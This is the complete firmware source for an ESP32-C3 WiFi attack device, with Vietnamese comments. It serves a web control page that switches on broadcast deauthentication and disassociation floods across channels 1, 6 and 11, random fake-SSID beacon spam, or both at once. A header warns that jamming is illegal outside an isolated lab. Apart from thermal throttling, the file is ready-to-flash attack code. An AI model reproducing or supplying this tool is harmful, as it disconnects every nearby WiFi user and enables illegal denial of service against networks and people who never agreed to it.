/*
 * ESP32-C3 WiFi Jammer via Web Server — BẢN CHỐNG QUÁ NHIỆT
 * - AP "C3-Jammer" / pass 12345678
 * - Web UI: DEAUTH / BEACON SPAM / JAM ALL
 * - Giảm tải nhiệt: TX 13dBm, burst 1s / nghỉ 4s, chỉ 3 kênh
 * - Tự tắt khi chip > 80°C
 *
 * Board: ESP32-C3 Dev Module
 * Core:  esp32 by Espressif (2.0.14 hoặc 3.x)
 * Libraries: built-in only
 *
 * ⚠️ CHỈ DÙNG TRONG LAB CÁCH LY — GÂY NHIỄU WIFI VI PHẠM PHÁP LUẬT
 */

#include <WiFi.h>
#include <WebServer.h>
#include <esp_wifi.h>
#include <esp_netif.h>
#include <esp_event.h>

// ============================================================
// KHÔNG định nghĩa ieee80211_raw_frame_sanity_check
// (đã có sẵn trong libnet80211.a → trùng symbol khi link)
// ============================================================

extern "C" {
  esp_err_t esp_wifi_set_channel(uint8_t primary, wifi_second_chan_t second);
  esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
}

// ============================================================
// CẤU HÌNH
// ============================================================
const char* AP_SSID = "C3-Jammer";
const char* AP_PASS = "12345678";

// Ngưỡng nhiệt độ tự tắt (°C)
const float TEMP_LIMIT = 80.0f;

WebServer server(80);

volatile bool     flagDeauth    = false;
volatile bool     flagBeacon    = false;
volatile bool     flagJamAll    = false;
volatile uint32_t pktCount      = 0;
volatile uint32_t beaconCount   = 0;
volatile float    chipTemp      = 0.0f;

// ============================================================
// FRAME TEMPLATES
// ============================================================
static const uint8_t deauth_tmpl[] = {
  0xC0, 0x00, 0x00, 0x00,
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
  0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,
  0x07,0x00
};

uint8_t beacon_packet[109] = {
  0x80,0x00,0x00,0x00,
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
  0x01,0x02,0x03,0x04,0x05,0x06,
  0x01,0x02,0x03,0x04,0x05,0x06,
  0x00,0x00,
  0x83,0x51,0xf7,0x8f,0x0f,0x00,0x00,0x00,
  0xe8,0x03,
  0x31,0x00,
  0x00,0x20,
  0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,
  0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,
  0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,
  0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,
  0x01,0x08,0x82,0x84,0x8b,0x96,0x24,0x30,0x48,0x6c,
  0x03,0x01,0x01,
  0x30,0x18,0x01,0x00,0x00,0x0f,0xac,0x02,
  0x02,0x00,0x00,0x0f,0xac,0x04,0x00,0x0f,0xac,0x04,
  0x01,0x00,0x00,0x0f,0xac,0x02,0x00,0x00
};

// ============================================================
// GỬI FRAME
// ============================================================
static inline void sendDeauth(uint8_t chan,
                              const uint8_t* rcv,
                              const uint8_t* src,
                              const uint8_t* bssid,
                              uint8_t type = 0xC0) {
  esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);

  uint8_t f[sizeof(deauth_tmpl)];
  memcpy(f, deauth_tmpl, sizeof(deauth_tmpl));
  f[0] = type;
  memcpy(f + 4,  rcv,   6);
  memcpy(f + 10, src,   6);
  memcpy(f + 16, bssid, 6);

  uint16_t seq = (uint16_t)(random(0, 4096) << 4);
  f[22] = seq & 0xFF;
  f[23] = (seq >> 8) & 0xFF;

  esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), false);
  pktCount++;
}

static inline void sendBeacon(uint8_t chan, const char* ssid) {
  uint8_t mac[6];
  for (int i = 0; i < 6; i++) mac[i] = (uint8_t)random(256);

  uint8_t pkt[109];
  memcpy(pkt, beacon_packet, 109);
  memcpy(&pkt[10], mac, 6);
  memcpy(&pkt[16], mac, 6);
  memset(&pkt[38], ' ', 32);

  size_t len = strlen(ssid);
  if (len > 32) len = 32;
  memcpy(&pkt[38], ssid, len);
  pkt[82] = chan;

  esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
  esp_wifi_80211_tx(WIFI_IF_AP, pkt, sizeof(pkt), false);
  beaconCount++;
}

// ============================================================
// TASK JAMMER — bản giảm nhiệt
// ============================================================
void jammerTask(void* pv) {
  // Chỉ 3 kênh chính, bỏ các kênh phụ để giảm hoạt động radio
  const uint8_t channels[] = {1, 6, 11};
  const int nCh = 3;
  char ssidBuf[33];

  for (;;) {
    if (!flagDeauth && !flagBeacon && !flagJamAll) {
      vTaskDelay(pdMS_TO_TICKS(500));
      continue;
    }

    // Nếu chip quá nóng → tạm dừng jammer
    if (chipTemp > TEMP_LIMIT) {
      vTaskDelay(pdMS_TO_TICKS(1000));
      continue;
    }

    unsigned long t0 = millis();

    // ===== BURST NGẮN: 1 giây =====
    while (millis() - t0 < 1000) {
      if (!flagDeauth && !flagBeacon && !flagJamAll) break;
      if (chipTemp > TEMP_LIMIT) break;

      // DEAUTH broadcast trên 3 kênh
      if (flagDeauth || flagJamAll) {
        static const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        for (uint8_t i = 0; i < nCh; i++) {
          sendDeauth(channels[i], bcast, bcast, bcast, 0xC0);
          sendDeauth(channels[i], bcast, bcast, bcast, 0xA0);
        }
      }

      // BEACON SPAM — chỉ 2 SSID/lần
      if (flagBeacon || flagJamAll) {
        for (int i = 0; i < 2; i++) {
          uint8_t len = random(6, 16);
          for (uint8_t j = 0; j < len; j++) ssidBuf[j] = (char)random(32, 127);
          ssidBuf[len] = 0;
          sendBeacon(channels[random(0, nCh)], ssidBuf);
        }
      }

      // Nghỉ 5ms giữa các frame để radio hạ nhiệt
      vTaskDelay(pdMS_TO_TICKS(5));
    }

    // ===== NGHỈ DÀI: 4 giây =====
    vTaskDelay(pdMS_TO_TICKS(4000));
  }
}

// ============================================================
// TASK GIÁM SÁT NHIỆT ĐỘ
// ============================================================
void tempTask(void* pv) {
  for (;;) {
    // temperatureRead() có trên core 3.x; core 2.x dùng hàm khác.
    // Nếu build lỗi, comment đoạn này lại.
    #if ESP_ARDUINO_VERSION_MAJOR >= 3
      chipTemp = temperatureRead();
    #else
      // Core 2.x: dùng temp_sensor (cần driver)
      // Đơn giản hóa: để 0 (bỏ qua giám sát nhiệt)
      chipTemp = 0.0f;
    #endif

    Serial.printf("[TEMP] %.1f C  pkts=%lu  bcns=%lu\n",
                  chipTemp,
                  (unsigned long)pktCount,
                  (unsigned long)beaconCount);

    // Nếu quá nóng, tự tắt jammer
    if (chipTemp > TEMP_LIMIT) {
      flagDeauth = false;
      flagBeacon = false;
      flagJamAll = false;
      Serial.println("[TEMP] QUA NONG! Da tat jammer.");
    }

    vTaskDelay(pdMS_TO_TICKS(5000));   // đọc mỗi 5 giây
  }
}

// ============================================================
// WEB UI
// ============================================================
const char PAGE_HTML[] PROGMEM = R"HTML(
<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>C3 Jammer</title>
<style>
  body{font-family:Arial;background:#111;color:#eee;margin:0;padding:20px}
  h1{text-align:center;color:#f44}
  .card{background:#222;border-radius:10px;padding:16px;margin:12px 0}
  .row{display:flex;justify-content:space-between;align-items:center;margin:10px 0}
  .switch{position:relative;display:inline-block;width:60px;height:34px}
  .switch input{opacity:0;width:0;height:0}
  .slider{position:absolute;cursor:pointer;inset:0;background:#555;border-radius:34px;transition:.3s}
  .slider:before{position:absolute;content:"";height:26px;width:26px;left:4px;bottom:4px;background:#fff;border-radius:50%;transition:.3s}
  input:checked + .slider{background:#f44}
  input:checked + .slider:before{transform:translateX(26px)}
  .stat{font-size:14px;color:#8f8}
  .warn{color:#f44;font-weight:bold}
  button{background:#444;color:#fff;border:0;padding:10px 16px;border-radius:6px;font-size:16px}
  button:active{background:#f44}
</style></head><body>
<h1>⚡ C3 JAMMER ⚡</h1>

<div class="card">
  <div class="row"><b>DEAUTH (ngat ket noi)</b>
    <label class="switch"><input type="checkbox" id="deauth"><span class="slider"></span></label>
  </div>
  <div class="row"><b>BEACON SPAM (SSID gia)</b>
    <label class="switch"><input type="checkbox" id="beacon"><span class="slider"></span></label>
  </div>
  <div class="row"><b>JAM ALL (ca 2)</b>
    <label class="switch"><input type="checkbox" id="jamall"><span class="slider"></span></label>
  </div>
</div>

<div class="card">
  <div class="row"><span>Packets:</span><span class="stat" id="pkts">0</span></div>
  <div class="row"><span>Beacons:</span><span class="stat" id="bcns">0</span></div>
  <div class="row"><span>Nhiet do chip:</span><span class="stat" id="temp">--</span></div>
  <div class="row"><span>Trang thai:</span><span class="stat" id="state">IDLE</span></div>
</div>

<div class="card" style="text-align:center">
  <button onclick="stopAll()">STOP ALL</button>
</div>

<div id="warn" class="card warn" style="display:none;text-align:center">
  QUA NHIET — Jammer da tu dong tat
</div>

<script>
function send(id,val){
  fetch('/set?id='+id+'&v='+(val?1:0)).then(r=>r.text()).catch(()=>{});
}
document.getElementById('deauth').onchange = e => send('deauth', e.target.checked);
document.getElementById('beacon').onchange = e => send('beacon', e.target.checked);
document.getElementById('jamall').onchange = e => send('jamall', e.target.checked);

function stopAll(){
  ['deauth','beacon','jamall'].forEach(id=>{
    document.getElementById(id).checked = false;
    send(id, 0);
  });
}

function refresh(){
  fetch('/status').then(r=>r.json()).then(j=>{
    document.getElementById('pkts').innerText = j.pkts;
    document.getElementById('bcns').innerText = j.bcns;
    document.getElementById('temp').innerText = j.temp.toFixed(1) + ' C';
    document.getElementById('state').innerText = j.state;
    document.getElementById('deauth').checked = j.deauth;
    document.getElementById('beacon').checked = j.beacon;
    document.getElementById('jamall').checked = j.jamall;
    document.getElementById('warn').style.display = j.hot ? 'block' : 'none';
  }).catch(()=>{});
}
setInterval(refresh, 1500);
refresh();
</script></body></html>
)HTML";

// ============================================================
// HANDLERS
// ============================================================
void handleRoot() {
  server.send_P(200, "text/html", PAGE_HTML);
}

void handleSet() {
  if (server.hasArg("id") && server.hasArg("v")) {
    String id = server.arg("id");
    bool v = (server.arg("v") == "1");

    if (id == "deauth") {
      flagDeauth = v;
    } else if (id == "beacon") {
      flagBeacon = v;
    } else if (id == "jamall") {
      flagJamAll = v;
      if (v) { flagDeauth = true; flagBeacon = true; }
    }
  }
  server.send(200, "text/plain", "OK");
}

void handleStatus() {
  bool hot = (chipTemp > TEMP_LIMIT);
  const char* st = hot ? "QUA NHIET"
                       : ((flagJamAll || flagDeauth || flagBeacon) ? "JAMMING" : "IDLE");

  String json = "{";
  json += "\"pkts\":"   + String((uint32_t)pktCount)    + ",";
  json += "\"bcns\":"   + String((uint32_t)beaconCount) + ",";
  json += "\"deauth\":" + String(flagDeauth ? "true" : "false") + ",";
  json += "\"beacon\":" + String(flagBeacon ? "true" : "false") + ",";
  json += "\"jamall\":" + String(flagJamAll ? "true" : "false") + ",";
  json += "\"temp\":"   + String(chipTemp, 1) + ",";
  json += "\"hot\":"    + String(hot ? "true" : "false") + ",";
  json += "\"state\":\"" + String(st) + "\"";
  json += "}";
  server.send(200, "application/json", json);
}

// ============================================================
// SETUP
// ============================================================
void setup() {
  Serial.begin(115200);
  delay(500);
  Serial.println("\n[C3-Jammer] Booting...");

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(AP_SSID, AP_PASS);
  delay(100);
  Serial.printf("[AP] SSID=%s IP=%s\n",
                AP_SSID, WiFi.softAPIP().toString().c_str());

  esp_wifi_set_promiscuous(false);

  // ===== GIẢM CÔNG SUẤT TX (52 ≈ 13 dBm) để chống nóng =====
  esp_wifi_set_max_tx_power(52);

  // Cho phép modem sleep khi rảnh
  esp_wifi_set_ps(WIFI_PS_MIN_MODEM);

  // Web server
  server.on("/",       handleRoot);
  server.on("/set",    handleSet);
  server.on("/status", handleStatus);
  server.begin();
  Serial.println("[WEB] http://192.168.4.1");

  // Task jammer + task giám sát nhiệt
  xTaskCreatePinnedToCore(jammerTask, "jammer", 4096, NULL, 1, NULL, 0);
  xTaskCreatePinnedToCore(tempTask,   "temp",   2048, NULL, 1, NULL, 0);

  randomSeed(esp_random());
  Serial.println("[OK] Ready. Chi dung trong lab cach ly!");
}

// ============================================================
// LOOP
// ============================================================
void loop() {
  server.handleClient();
  delay(2);
}